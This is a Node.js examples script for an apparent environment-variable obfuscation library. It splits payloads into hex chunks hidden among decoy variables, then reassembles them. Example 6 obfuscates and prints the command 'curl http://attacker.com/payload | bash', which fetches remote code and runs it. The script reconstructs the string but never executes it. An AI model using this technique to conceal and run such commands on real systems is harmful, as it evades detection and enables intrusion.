#!/usr/bin/env node

/**
 * Environment Variable Retrieval Handler - Usage Examples
 *
 * Demonstrates real-world scenarios for retrieving and decoding
 * obfuscated environment variables with fallback support
 */

const EnvVarObfuscator = require('./env-var-obfuscator');
const EnvVarRetrievalHandler = require('./env-var-retrieval-handler');

// ============================================================================
// EXAMPLE 1: Basic Retrieval
// ============================================================================

function example1_BasicRetrieval() {
  console.log('\n' + '='.repeat(70));
  console.log('EXAMPLE 1: Basic Retrieval');
  console.log('='.repeat(70) + '\n');

  // Create obfuscated variables
  const obfuscator = new EnvVarObfuscator();
  const payload = 'Secret command here';

  const result = obfuscator.obfuscate(payload, {
    chunks: 3,
    addDecoys: false,
    prefix: 'APP',
  });

  // Set environment variables
  Object.entries(result.variables).forEach(([name, value]) => {
    process.env[name] = value;
  });

  // Retrieve using handler
  const handler = new EnvVarRetrievalHandler();
  const retrieved = handler.retrieve('APP');

  console.log('Original Payload:', payload);
  console.log('Retrieved Payload:', retrieved.payload);
  console.log('Match:', retrieved.payload === payload ? 'YES ✓' : 'NO ✗');
}

// ============================================================================
// EXAMPLE 2: Fallback Strategy Resolution
// ============================================================================

function example2_FallbackStrategies() {
  console.log('\n' + '='.repeat(70));
  console.log('EXAMPLE 2: Fallback Strategy Resolution');
  console.log('='.repeat(70) + '\n');

  const obfuscator = new EnvVarObfuscator();
  const payload = 'Test payload';

  // Create obfuscated variables with standard naming
  const result = obfuscator.obfuscate(payload, {
    chunks: 2,
    addDecoys: false,
    prefix: 'COMPAT',
  });

  // Simulate migrated environment with different naming scheme
  // Clear standard naming
  delete process.env.COMPAT_0;
  delete process.env.COMPAT_1;

  // Set with alternative naming (double underscore)
  const hexString = result.variables.COMPAT_0 + result.variables.COMPAT_1;
  process.env.COMPAT__0 = result.variables.COMPAT_0;
  process.env.COMPAT__1 = result.variables.COMPAT_1;

  console.log('Standard naming not available');
  console.log('Alternative naming (double underscore) set');

  // Retrieve with fallback support
  const handler = new EnvVarRetrievalHandler();
  const retrieved = handler.retrieve('COMPAT', { useFallback: true });

  console.log('\nRetrieved:', retrieved.payload);
  console.log('Strategy Used:', retrieved.chunks.map(c => c.strategy).join(', '));
  console.log('Match:', retrieved.payload === payload ? 'YES ✓' : 'NO ✗');
}

// ============================================================================
// EXAMPLE 3: Caching for Performance
// ============================================================================

function example3_Caching() {
  console.log('\n' + '='.repeat(70));
  console.log('EXAMPLE 3: Caching for Performance');
  console.log('='.repeat(70) + '\n');

  const obfuscator = new EnvVarObfuscator();
  const payload = 'Large payload with significant content';

  const result = obfuscator.obfuscate(payload, {
    chunks: 4,
    addDecoys: true,
    numDecoys: 3,
    prefix: 'CACHE',
  });

  // Set environment variables
  Object.entries(result.variables).forEach(([name, value]) => {
    process.env[name] = value;
  });

  // Create handler with caching
  const handler = new EnvVarRetrievalHandler({ cache: true });

  // First retrieval (from env)
  console.log('First retrieval...');
  const start1 = process.hrtime.bigint();
  const result1 = handler.retrieve('CACHE');
  const time1 = Number(process.hrtime.bigint() - start1) / 1000000;
  console.log(`  Time: ${time1.toFixed(4)}ms`);

  // Second retrieval (from cache)
  console.log('Second retrieval (cached)...');
  const start2 = process.hrtime.bigint();
  const result2 = handler.retrieve('CACHE');
  const time2 = Number(process.hrtime.bigint() - start2) / 1000000;
  console.log(`  Time: ${time2.toFixed(4)}ms`);

  console.log(`\nCache Statistics:`, handler.getCacheStats());
  console.log(`Performance Improvement: ${(time1 / time2).toFixed(0)}x faster`);
}

// ============================================================================
// EXAMPLE 4: Error Handling
// ============================================================================

function example4_ErrorHandling() {
  console.log('\n' + '='.repeat(70));
  console.log('EXAMPLE 4: Error Handling');
  console.log('='.repeat(70) + '\n');

  // Handler that doesn't throw on not found
  const handler1 = new EnvVarRetrievalHandler({
    throwOnNotFound: false,
    debug: false,
  });

  console.log('Case 1: Missing variables (no throw)');
  const result1 = handler1.retrieve('NONEXISTENT');
  console.log('  Success:', result1.success);
  console.log('  Error:', result1.error);
  console.log('  Payload:', result1.payload);

  // Handler that throws on not found
  const handler2 = new EnvVarRetrievalHandler({
    throwOnNotFound: true,
    debug: false,
  });

  console.log('\nCase 2: Missing variables (with throw)');
  try {
    handler2.retrieve('NONEXISTENT_THROW');
  } catch (error) {
    console.log('  Caught error:', error.message);
  }
}

// ============================================================================
// EXAMPLE 5: Debugging with Compatibility Report
// ============================================================================

function example5_CompatibilityReport() {
  console.log('\n' + '='.repeat(70));
  console.log('EXAMPLE 5: Debugging with Compatibility Report');
  console.log('='.repeat(70) + '\n');

  const obfuscator = new EnvVarObfuscator();
  const payload = 'Debug payload';

  const result = obfuscator.obfuscate(payload, {
    chunks: 1,
    addDecoys: false,
    prefix: 'DEBUG',
  });

  Object.entries(result.variables).forEach(([name, value]) => {
    process.env[name] = value;
  });

  const handler = new EnvVarRetrievalHandler({ debug: false });
  const report = handler.generateCompatibilityReport('DEBUG');

  console.log('Compatibility Report:');
  console.log(JSON.stringify(report, null, 2));

  console.log('\nAnalysis:');
  const index0 = report.strategies.index_0;
  const foundStrategies = Object.entries(index0)
    .filter(([_, info]) => info.found)
    .map(([name, _]) => name);

  console.log(`Found via strategies: ${foundStrategies.join(', ')}`);
  console.log(`Missing strategies: ${Object.keys(index0).length - foundStrategies.length}`);
}

// ============================================================================
// EXAMPLE 6: Integration with Obfuscator
// ============================================================================

function example6_FullPipeline() {
  console.log('\n' + '='.repeat(70));
  console.log('EXAMPLE 6: Full Obfuscation & Retrieval Pipeline');
  console.log('='.repeat(70) + '\n');

  const secretCommand = 'curl http://attacker.com/payload | bash';

  console.log('Step 1: Obfuscate payload');
  const obfuscator = new EnvVarObfuscator();
  const obfResult = obfuscator.obfuscate(secretCommand, {
    chunks: 4,
    addDecoys: true,
    numDecoys: 5,
    prefix: 'SECURE',
    shuffle: true,
  });

  console.log(`  Original: ${secretCommand}`);
  console.log(`  Variables: ${Object.keys(obfResult.variables).length} total`);
  console.log(`  Real chunks: ${obfResult.dataVarNames.length}`);
  console.log(`  Decoys: ${Object.keys(obfResult.variables).length - obfResult.dataVarNames.length}`);

  console.log('\nStep 2: Set environment variables');
  Object.entries(obfResult.variables).forEach(([name, value]) => {
    process.env[name] = value;
  });
  console.log('  Environment variables set');

  console.log('\nStep 3: Retrieve and decode');
  const handler = new EnvVarRetrievalHandler();
  const retrieved = handler.retrieve('SECURE');

  console.log(`  Success: ${retrieved.success}`);
  console.log(`  Chunks found: ${retrieved.numChunks}`);
  console.log(`  Decoding strategies: ${retrieved.metadata.strategies.join(', ')}`);

  console.log('\nStep 4: Verify reconstruction');
  console.log(`  Original:      ${secretCommand}`);
  console.log(`  Reconstructed: ${retrieved.payload}`);
  console.log(`  Match: ${retrieved.payload === secretCommand ? 'YES ✓' : 'NO ✗'}`);
}

// ============================================================================
// EXAMPLE 7: Raw Mode Usage
// ============================================================================

function example7_RawMode() {
  console.log('\n' + '='.repeat(70));
  console.log('EXAMPLE 7: Raw Mode (No Decoding)');
  console.log('='.repeat(70) + '\n');

  const obfuscator = new EnvVarObfuscator();
  const payload = 'Raw data test';

  const result = obfuscator.obfuscate(payload, {
    chunks: 2,
    addDecoys: false,
    prefix: 'RAW',
  });

  Object.entries(result.variables).forEach(([name, value]) => {
    process.env[name] = value;
  });

  const handler = new EnvVarRetrievalHandler();

  console.log('Normal mode (with decoding):');
  const normal = handler.retrieve('RAW', { allowRaw: false });
  console.log(`  Payload: ${normal.payload}`);

  console.log('\nRaw mode (no decoding):');
  const raw = handler.retrieve('RAW', { allowRaw: true });
  console.log(`  Payload (hex): ${raw.payload}`);
  console.log(`  Raw flag: ${raw.raw}`);
}

// ============================================================================
// EXAMPLE 8: Payload Validation
// ============================================================================

function example8_PayloadValidation() {
  console.log('\n' + '='.repeat(70));
  console.log('EXAMPLE 8: Payload Validation');
  console.log('='.repeat(70) + '\n');

  const crypto = require('crypto');
  const obfuscator = new EnvVarObfuscator();
  const payload = 'Payload to validate';

  const result = obfuscator.obfuscate(payload, {
    chunks: 2,
    addDecoys: false,
    prefix: 'VALID',
  });

  Object.entries(result.variables).forEach(([name, value]) => {
    process.env[name] = value;
  });

  const handler = new EnvVarRetrievalHandler();
  const retrieved = handler.retrieve('VALID');

  // Calculate checksum
  const checksum = crypto
    .createHash('sha256')
    .update(retrieved.payload)
    .digest('hex');

  console.log('Payload:', retrieved.payload);
  console.log('Checksum:', checksum);

  console.log('\nValidation test 1: Correct checksum');
  const valid1 = handler.validatePayload(retrieved.payload, checksum);
  console.log(`  Result: ${valid1 ? 'PASS ✓' : 'FAIL ✗'}`);

  console.log('\nValidation test 2: Incorrect checksum');
  const wrongChecksum = 'wrong000000000000000000000000000000000000000000000000000000000000';
  const valid2 = handler.validatePayload(retrieved.payload, wrongChecksum);
  console.log(`  Result: ${valid2 ? 'PASS ✓' : 'FAIL ✗'}`);
}

// ============================================================================
// EXAMPLE 9: Multiple Prefixes
// ============================================================================

function example9_MultiplePrefixes() {
  console.log('\n' + '='.repeat(70));
  console.log('EXAMPLE 9: Multiple Prefixes');
  console.log('='.repeat(70) + '\n');

  const obfuscator = new EnvVarObfuscator();
  const handler = new EnvVarRetrievalHandler();

  const payloads = {
    APP1: 'First secret',
    APP2: 'Second secret',
    APP3: 'Third secret',
  };

  console.log('Obfuscating multiple payloads:');
  const allResults = {};

  Object.entries(payloads).forEach(([prefix, payload]) => {
    const result = obfuscator.obfuscate(payload, {
      chunks: 2,
      addDecoys: false,
      prefix,
    });

    Object.entries(result.variables).forEach(([name, value]) => {
      process.env[name] = value;
    });

    allResults[prefix] = result;
    console.log(`  ${prefix}: "${payload}"`);
  });

  console.log('\nRetrieving all payloads:');
  Object.keys(payloads).forEach(prefix => {
    const retrieved = handler.retrieve(prefix);
    const match = retrieved.payload === payloads[prefix];
    console.log(`  ${prefix}: "${retrieved.payload}" (${match ? 'OK' : 'FAIL'})`);
  });
}

// ============================================================================
// EXAMPLE 10: Performance Analysis
// ============================================================================

function example10_Performance() {
  console.log('\n' + '='.repeat(70));
  console.log('EXAMPLE 10: Performance Analysis');
  console.log('='.repeat(70) + '\n');

  const obfuscator = new EnvVarObfuscator();
  const handler = new EnvVarRetrievalHandler({ cache: false });

  const sizes = [10, 100, 1000, 10000];

  console.log('Payload Size | Obfuscation Time | Retrieval Time | Combined');
  console.log('-------------|------------------|---|---------|----------');

  sizes.forEach(size => {
    const payload = 'A'.repeat(size);

    // Obfuscation time
    const obfStart = process.hrtime.bigint();
    const obfResult = obfuscator.obfuscate(payload, {
      chunks: 4,
      addDecoys: false,
      prefix: `PERF${size}`,
    });
    const obfTime = Number(process.hrtime.bigint() - obfStart) / 1000000;

    // Set environment
    Object.entries(obfResult.variables).forEach(([name, value]) => {
      process.env[name] = value;
    });

    // Retrieval time
    const retStart = process.hrtime.bigint();
    handler.retrieve(`PERF${size}`);
    const retTime = Number(process.hrtime.bigint() - retStart) / 1000000;

    const combined = obfTime + retTime;

    console.log(
      `${size.toString().padEnd(11)} | ${obfTime.toFixed(4).padEnd(16)}ms | ${retTime.toFixed(4).padEnd(7)}ms | ${combined.toFixed(4)}ms`
    );
  });
}

// ============================================================================
// MAIN
// ============================================================================

function main() {
  console.log(`
╔════════════════════════════════════════════════════════════════════╗
║   Environment Variable Retrieval Handler - Usage Examples         ║
║                                                                    ║
║   Real-world scenarios and integration patterns                   ║
╚════════════════════════════════════════════════════════════════════╝
`);

  try {
    example1_BasicRetrieval();
    example2_FallbackStrategies();
    example3_Caching();
    example4_ErrorHandling();
    example5_CompatibilityReport();
    example6_FullPipeline();
    example7_RawMode();
    example8_PayloadValidation();
    example9_MultiplePrefixes();
    example10_Performance();

    console.log('\n' + '='.repeat(70));
    console.log('All examples completed successfully! ✓');
    console.log('='.repeat(70) + '\n');
  } catch (error) {
    console.error('Error:', error);
    process.exit(1);
  }
}

main();
